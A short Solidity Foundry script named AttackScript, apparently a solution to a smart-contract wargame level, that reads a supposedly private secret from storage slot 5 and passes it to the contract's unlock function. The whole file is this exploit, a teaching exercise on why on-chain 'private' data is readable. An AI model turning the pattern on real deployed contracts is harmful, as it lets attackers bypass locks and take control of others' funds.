//SPDX-License-Identifier: MIT

pragma solidity 0.8.20;

import {Script} from "forge-std/Script.sol";

contract AttackScript is Script {
	
	address instance = /* Your instance address */;	

	function run() public {
	bytes32 secret = vm.load( instance, bytes32(uint256(5)) ); //vm.load loads the value from storage at fifth slot
	vm.startBroadcast();
	instance.call(abi.encodeWithSignature("unlock(bytes16)", bytes16(secret)));
	vm.stopBroadcast();
	}
}
